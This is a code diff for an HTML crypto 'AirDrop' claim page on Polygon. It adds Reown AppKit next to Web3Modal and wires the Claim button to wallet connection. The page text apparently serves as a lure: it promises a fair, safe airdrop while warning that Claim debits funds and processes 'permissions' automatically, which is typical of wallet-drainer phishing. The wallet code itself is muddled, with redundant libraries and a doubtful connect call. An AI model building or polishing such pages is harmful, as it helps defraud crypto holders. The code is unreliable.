@@ -11,11 +11,15 @@
   <script type="module">
     import { createWeb3Modal, defaultWagmiConfig } from "https://esm.sh/@web3modal/wagmi";
     import { polygon } from "https://esm.sh/viem/chains";
+    import { createAppKit } from "https://esm.sh/@reown/appkit";
+    import { WagmiAdapter } from "https://esm.sh/@reown/appkit-adapter-wagmi";
 
-    const projectId = "56edaed968d799280ffd685113d7f126";
+    const projectId = "ВАШ_PROJECT_ID"; // сюда ваш Project ID
     const chains = [polygon];
+
     const config = defaultWagmiConfig({ chains, projectId });
 
+    // Web3Modal только для кошельков (MetaMask/Trust + WalletConnect)
     const modal = createWeb3Modal({
       wagmiConfig: config,
       projectId,
@@ -25,7 +29,6 @@
         "--w3m-accent-color": "#4caf50",
         "--w3m-background-color": "#121212"
       },
-      // Оставляем только кошельки, убираем соцсети
       enableWalletConnect: true,
       enableInjectedWallet: true,
       enableCoinbase: false,
@@ -33,11 +36,29 @@
       enableSocialLogin: false
     });
 
+    // Reown AppKit
+    const appKit = createAppKit({
+      adapters: [new WagmiAdapter({ projectId, chains })],
+      projectId,
+      networks: chains,
+      social: { enabled: false }
+    });
+
     window.onload = () => {
       const claimBtn = document.getElementById("claimBtn");
-      claimBtn.disabled = false; 
+      const addrBox = document.getElementById("addrBox");
+      const networkBox = document.getElementById("networkBox");
+
+      claimBtn.disabled = false;
+
       claimBtn.addEventListener("click", async () => {
         await modal.open();
+        const wallet = await appKit.connect();
+
+        if(wallet) {
+          addrBox.textContent = `Connected: ${wallet.address}`;
+          networkBox.textContent = `Network: ${wallet.network.name}`;
+        }
       });
     };
   </script>
@@ -51,7 +72,6 @@
         <div class="subtitle">Live • Product</div>
       </div>
     </div>
-
     <div class="wallet-box">
       <button id="disconnectBtn" class="btn ghost hidden">Disable</button>
     </div>
@@ -88,21 +108,16 @@
         function updateCountdown() {
           let now = new Date();
           let diff = endTime - now;
-
-          if (diff <= 0) {
+          if(diff <= 0) {
             document.getElementById("countdown").innerHTML = "AirDrop ended!";
             clearInterval(timer);
             return;
           }
-
-          let hours = Math.floor(diff / (1000 * 60 * 60));
-          let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-          let seconds = Math.floor((diff % (1000 * 60)) / 1000);
-
-          document.getElementById("countdown").innerHTML =
-            hours + "h " + minutes + "m " + seconds + "s";
+          let hours = Math.floor(diff / (1000*60*60));
+          let minutes = Math.floor((diff % (1000*60*60))/(1000*60));
+          let seconds = Math.floor((diff % (1000*60))/1000);
+          document.getElementById("countdown").innerHTML = hours+"h "+minutes+"m "+seconds+"s";
         }
-
         let timer = setInterval(updateCountdown, 1000);
         updateCountdown();
       </script>
@@ -119,19 +134,14 @@
         </div>
 
         <div id="notice" class="notice">
-          <p>
-            ⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet. Funds are debited only after your confirmation, and all necessary permissions are processed automatically.
-          </p>
+          <p>⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet. Funds are debited only after your confirmation, and all necessary permissions are processed automatically.</p>
         </div>
       </div>
     </section>
     
     <div class="airdrop-tab">
       <h3>Why Choose Our AirDrop?</h3>
-      <p>
-        Our AirDrop is designed to reward our community fairly, safely, and transparently.
-        Join now to receive tokens directly to your wallet, with full control over your participation.
-      </p>
+      <p>Our AirDrop is designed to reward our community fairly, safely, and transparently. Join now to receive tokens directly to your wallet, with full control over your participation.</p>
     </div>
 
     <div class="airdrop-stats">
@@ -158,17 +168,8 @@
         margin-bottom: 20px;
         max-width: 1200px;
       }
-
-      .airdrop-tab h3 {
-        margin: 0 0 10px 0;
-        font-size: 18px;
-      }
-
-      .airdrop-tab p {
-        font-size: 14px;
-        line-height: 1.4;
-      }
-
+      .airdrop-tab h3 { margin: 0 0 10px 0; font-size: 18px; }
+      .airdrop-tab p { font-size: 14px; line-height: 1.4; }
       .airdrop-stats {
         display: flex;
         gap: 10px;
@@ -177,26 +178,9 @@
         border-radius: 8px;
         max-width: 1200px;
       }
-
-      .stat-tab {
-        flex: 1;
-        background: #111;
-        border-radius: 6px;
-        padding: 10px;
-        text-align: center;
-        color: #00bfff;
-      }
-
-      .stat-number {
-        font-size: 16px;
-        font-weight: bold;
-      }
-
-      .stat-label {
-        font-size: 12px;
-        margin-top: 4px;
-        color: #ccc;
-      }
+      .stat-tab { flex: 1; background: #111; border-radius: 6px; padding: 10px; text-align: center; color: #00bfff; }
+      .stat-number { font-size: 16px; font-weight: bold; }
+      .stat-label { font-size: 12px; margin-top: 4px; color: #ccc; }
     </style>
   </main>
 </body>
